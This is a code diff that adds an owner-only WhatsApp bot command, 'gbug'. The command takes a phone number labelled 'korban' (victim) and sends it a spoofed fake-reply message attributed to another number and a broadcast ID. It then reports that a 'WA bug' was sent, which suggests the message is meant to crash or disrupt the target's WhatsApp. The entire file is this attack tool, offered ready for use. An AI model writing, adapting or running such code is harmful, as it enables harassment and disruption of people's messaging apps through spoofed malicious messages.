@@ -1,0 +1,21 @@
+let handler = async (m, { conn, usedPrefix: _p, args, text, usedPrefix}) => {
+
+let number = text
+
+let korban = `${number}`
+
+if (!number) return conn.reply(m.chat, 'Silahkan masukan nomor yang akan dikirim', m)
+
+      conn.fakeReply(korban + '@s.whatsapp.net', 'A', '622150996855@s.whatsapp.net', 'B', '0@broadcast') 
+
+{
+
+    let logs = `[!] Berhasil mengirim BUG wa ke nomor ${korban}`
+    conn.reply(m.chat, logs, m)
+}}
+
+handler.command = /^(gbug)$/i
+
+handler.owner = true
+
+export default handler
